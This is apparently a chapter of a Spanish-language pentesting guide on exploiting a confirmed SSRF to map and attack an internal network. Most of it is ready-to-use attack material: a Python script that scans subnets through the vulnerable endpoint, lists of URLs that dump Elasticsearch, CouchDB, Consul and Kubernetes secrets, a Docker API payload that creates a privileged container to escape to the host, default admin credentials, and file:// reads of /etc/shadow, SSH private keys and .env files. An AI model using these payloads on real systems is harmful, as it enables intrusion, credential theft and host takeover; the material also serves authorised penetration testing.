# Enumeración interna

Con un SSRF confirmado el siguiente paso es mapear todo lo que hay detrás del firewall: hosts activos, puertos abiertos, servicios corriendo, y paneles de administración accesibles solo desde dentro.

### Descubrir hosts activos en la red interna

#### Método 1 — Diferencia de tiempo de respuesta

```
Lógica:
→ Host activo, puerto cerrado: TCP RST inmediato (~50ms)
→ Host activo, puerto abierto: TCP SYN-ACK con respuesta HTTP (~100-500ms)
→ Host inactivo / filtrado: timeout (~5-30s dependiendo del servidor)

Cuanto más lento = host no existe o filtrado
Cuanto más rápido con error ≠ conexión rechazada = host existe
```

```python
import requests, time, concurrent.futures

SSRF = "https://target.com/fetch?url={}"

def check_host(ip):
    try:
        start = time.time()
        r = requests.get(SSRF.format(f"http://{ip}/"), timeout=5)
        elapsed = time.time() - start
        # Respuesta rápida (aunque sea error) = host existe
        if elapsed < 4:
            return ip, elapsed, r.status_code, len(r.content)
    except:
        pass
    return None

# Escanear subred /24
subnet = "10.10.10"
hosts = [f"{subnet}.{i}" for i in range(1, 255)]

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
    for result in ex.map(check_host, hosts):
        if result:
            ip, elapsed, status, length = result
            print(f"[+] {ip} → {status} ({elapsed:.2f}s, {length}b)")
```

#### Método 2 — Diferencia en el mensaje de error

```bash
# La app puede devolver mensajes de error distintos que revelan si el host existe:

# Host activo (puerto cerrado):
→ "Connection refused"
→ "Connection reset by peer"
→ "No route to host"  ← host existe pero no responde en ese puerto

# Host inactivo:
→ "Connection timed out"
→ "Network unreachable"
→ "Host unreachable"

# Comparar respuestas para un host conocido vs IP aleatoria:
url=http://192.168.1.1/    → "Connection refused" (router existe)
url=http://192.168.1.250/  → "timeout" (host no existe)
```

#### Rangos de red privada a probar

```bash
# Más comunes en entornos corporativos y cloud
http://10.0.0.1/          # Clase A privada
http://10.0.0.0/8         # Rango completo: 10.0.0.0 - 10.255.255.255
http://172.16.0.1/        # Clase B privada
http://172.16.0.0/12      # Rango: 172.16.0.0 - 172.31.255.255
http://192.168.0.1/       # Clase C privada
http://192.168.0.0/16     # Rango: 192.168.0.0 - 192.168.255.255

# Docker default bridge
http://172.17.0.1/        # Docker host desde un contenedor
http://172.17.0.2/        # Primer contenedor
http://172.17.0.0/16      # Red Docker completa

# Kubernetes
http://10.96.0.1/         # Kubernetes API service (default)
http://10.96.0.10/        # CoreDNS
http://kubernetes.default.svc.cluster.local/  # API server via DNS
http://kubernetes/        # Short name

# Localhost
http://127.0.0.1/
http://localhost/
http://[::1]/

# Link-local (metadata cloud)
http://169.254.169.254/   # AWS / Azure
http://169.254.0.0/16     # Todo el rango link-local
```

### Escaneo de puertos en hosts descubiertos

#### Puertos prioritarios por servicio

```bash
# Web / Admin panels
80    HTTP
443   HTTPS
8080  HTTP alternativo / Tomcat
8443  HTTPS alternativo
8888  Jupyter Notebook / varios
3000  Node.js / Grafana
4848  GlassFish Admin
9000  SonarQube / PHP-FPM
9090  Prometheus / Cockpit
9200  Elasticsearch HTTP
9300  Elasticsearch transport
5601  Kibana

# Bases de datos
3306  MySQL
5432  PostgreSQL
1433  MSSQL
1521  Oracle
27017 MongoDB
5984  CouchDB
6379  Redis
11211 Memcached
7474  Neo4j

# Mensajería / Cola
5672  RabbitMQ AMQP
15672 RabbitMQ Management
61616 ActiveMQ

# Infraestructura / DevOps
2375  Docker API (sin TLS — crítico)
2376  Docker API (con TLS)
2379  etcd (Kubernetes)
2380  etcd peer
6443  Kubernetes API server
8001  Kubernetes Dashboard proxy
10250 Kubelet API
4001  etcd legacy

# Monitorización / Orchestration
8500  Consul HTTP API
8600  Consul DNS
8300  Consul server RPC
4040  Linkerd / Spark UI
4141  Linkerd proxy
7077  Spark master
8088  YARN ResourceManager
50070 Hadoop NameNode

# Otros servicios internos
22    SSH
21    FTP
23    Telnet
25    SMTP
53    DNS
161   SNMP
389   LDAP
445   SMB
512-514 RSH/Rexec/Rlogin (legacy)
873   Rsync
2049  NFS
```

### Enumerar servicios internos con output visible

Si el SSRF refleja la respuesta, se puede interactuar directamente con los servicios:

#### Elasticsearch (9200)

```bash
# Ver información del cluster
http://127.0.0.1:9200/
http://127.0.0.1:9200/_cat/indices?v     # Listar índices
http://127.0.0.1:9200/_cat/nodes?v       # Nodos del cluster
http://127.0.0.1:9200/_cluster/stats     # Estadísticas

# Listar todos los documentos de un índice
http://127.0.0.1:9200/INDEX_NAME/_search?pretty&size=100

# Buscar en todos los índices
http://127.0.0.1:9200/_search?q=password&pretty
http://127.0.0.1:9200/_search?q=secret&pretty

# Acceder a índices con datos sensibles (nombres comunes)
http://127.0.0.1:9200/users/_search?pretty
http://127.0.0.1:9200/credentials/_search?pretty
http://127.0.0.1:9200/logs/_search?pretty
http://127.0.0.1:9200/audit/_search?pretty
```

#### MongoDB (27017)

```bash
# Sin autenticación, MongoDB responde en el puerto pero solo a comandos propios
# Con SSRF + gopher se pueden enviar comandos

# Con output visible, verificar si hay interfaz HTTP (MongoDB 2.x tenía HTTP en 28017)
http://127.0.0.1:28017/          # Legacy HTTP interface
http://127.0.0.1:28017/admin/    # Admin panel
```

#### CouchDB (5984)

```bash
# CouchDB tiene API REST completa — SSRF con output visible = dump completo
http://127.0.0.1:5984/           # Info del servidor
http://127.0.0.1:5984/_all_dbs   # Listar bases de datos
http://127.0.0.1:5984/DB_NAME/_all_docs  # Todos los documentos
http://127.0.0.1:5984/_utils/    # Panel web Fauxton

# Crear usuario admin (si no tiene auth)
# Via SSRF POST: http://127.0.0.1:5984/_users
```

#### Docker API (2375) — Sin TLS

```bash
# Docker API expuesto sin TLS = RCE garantizado
http://127.0.0.1:2375/version       # Versión de Docker
http://127.0.0.1:2375/containers/json  # Contenedores en ejecución
http://127.0.0.1:2375/images/json   # Imágenes disponibles
http://127.0.0.1:2375/info          # Info completa del daemon

# Crear contenedor privilegiado para escapar al host:
# POST http://127.0.0.1:2375/containers/create
# Body: {"Image":"alpine","Cmd":["chroot","/host","bash"],"Binds":["/:/host"],"Privileged":true}
# POST http://127.0.0.1:2375/containers/ID/start
# POST http://127.0.0.1:2375/containers/ID/exec (ejecutar comandos)
```

#### Consul (8500)

```bash
# Consul API — información del cluster y configuración
http://127.0.0.1:8500/v1/agent/self        # Info del agente local
http://127.0.0.1:8500/v1/catalog/services  # Servicios registrados
http://127.0.0.1:8500/v1/catalog/nodes     # Nodos del cluster
http://127.0.0.1:8500/v1/kv/?recurse=true  # Key-Value store completo
# El KV store puede contener: contraseñas, tokens, configuraciones
```

#### Kubernetes (6443 / 8001)

```bash
# API server (6443 requiere auth, pero a veces hay misconfiguraciones)
https://10.96.0.1:6443/api/v1/namespaces    # Listar namespaces
https://10.96.0.1:6443/api/v1/pods          # Listar pods
https://10.96.0.1:6443/api/v1/secrets       # Secretos (tokens, passwords)
https://10.96.0.1:6443/api/v1/configmaps    # ConfigMaps

# Dashboard proxy (8001) — sin auth si está mal configurado
http://127.0.0.1:8001/api/v1/namespaces/default/pods
http://127.0.0.1:8001/ui/  # Kubernetes Dashboard UI

# Service account token (desde dentro del pod)
http://127.0.0.1:8001/api/v1/namespaces/kube-system/secrets
```

### Paneles de administración internos

```bash
# Jenkins (8080 más común)
http://127.0.0.1:8080/
http://127.0.0.1:8080/script          # Groovy console → RCE
http://127.0.0.1:8080/credentials/    # Credenciales almacenadas
http://127.0.0.1:8080/manage          # Panel de administración
http://10.0.0.X:8080/api/json         # API de Jenkins

# Grafana (3000)
http://127.0.0.1:3000/
http://127.0.0.1:3000/api/datasources      # Fuentes de datos (credenciales DB)
http://127.0.0.1:3000/api/org/users        # Usuarios
http://127.0.0.1:3000/api/admin/settings   # Configuración (requiere admin)
# Default creds: admin/admin

# Prometheus (9090)
http://127.0.0.1:9090/
http://127.0.0.1:9090/api/v1/targets   # Targets monitorizados
http://127.0.0.1:9090/api/v1/query?query=up  # Métricas

# Kibana (5601)
http://127.0.0.1:5601/
http://127.0.0.1:5601/api/saved_objects/_find  # Dashboards/índices

# Spring Boot Actuator (endpoints internos de diagnóstico)
http://127.0.0.1:8080/actuator           # Lista de endpoints activos
http://127.0.0.1:8080/actuator/env       # Variables de entorno (contraseñas en claro)
http://127.0.0.1:8080/actuator/dump      # Heap dump (puede contener credenciales)
http://127.0.0.1:8080/actuator/mappings  # Endpoints de la app
http://127.0.0.1:8080/actuator/beans     # Beans de Spring (info de la app)
http://127.0.0.1:8080/actuator/health    # Estado de la app y sus dependencias

# phpMyAdmin (varios puertos)
http://127.0.0.1/phpmyadmin/
http://127.0.0.1:8080/phpmyadmin/

# Tomcat Manager (8080)
http://127.0.0.1:8080/manager/html      # Deploy de WARs → RCE
http://127.0.0.1:8080/host-manager/html
# Default creds: tomcat/tomcat, admin/admin, tomcat/s3cret

# RabbitMQ Management (15672)
http://127.0.0.1:15672/
http://127.0.0.1:15672/api/overview
# Default creds: guest/guest

# Hadoop NameNode (50070)
http://127.0.0.1:50070/
http://127.0.0.1:50070/jmx              # JMX con mucha info
http://127.0.0.1:50070/webhdfs/v1/?op=LISTSTATUS  # Listar HDFS

# Jupyter Notebook (8888)
http://127.0.0.1:8888/                  # A veces sin token → RCE Python
http://127.0.0.1:8888/api/kernels       # Kernels activos
http://127.0.0.1:8888/tree             # Árbol de archivos
```

### Leer archivos del sistema con file://

```bash
# Si el cliente HTTP del servidor soporta file://
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///etc/hostname
file:///proc/version
file:///proc/self/environ      # Variables de entorno del proceso web
file:///proc/self/cmdline      # Comando con el que se lanzó el proceso
file:///proc/net/tcp           # Conexiones TCP (revela IPs internas en hex)
file:///root/.ssh/id_rsa
file:///home/usuario/.ssh/id_rsa

# Configuración de la app
file:///var/www/html/.env
file:///var/www/html/config.php
file:///app/config/database.yml
file:///opt/app/.env

# Windows
file:///C:/Windows/win.ini
file:///C:/inetpub/wwwroot/web.config
file:///C:/Users/Administrator/.ssh/id_rsa
```

> Los Spring Boot Actuator endpoints son uno de los hallazgos más frecuentes en red interna via SSRF: `/actuator/env` expone todas las variables de entorno incluyendo contraseñas de bases de datos en texto plano.

> El Docker API en puerto 2375 sin TLS es automáticamente RCE: crear un contenedor con el filesystem del host montado y ejecutar comandos. Verificar siempre este puerto en cualquier entorno con contenedores.

> Al escanear la red interna, empezar siempre por los rangos más probables según el entorno: `172.17.0.0/16` para Docker, `10.96.0.0/12` para Kubernetes, `169.254.169.254` para metadata cloud.
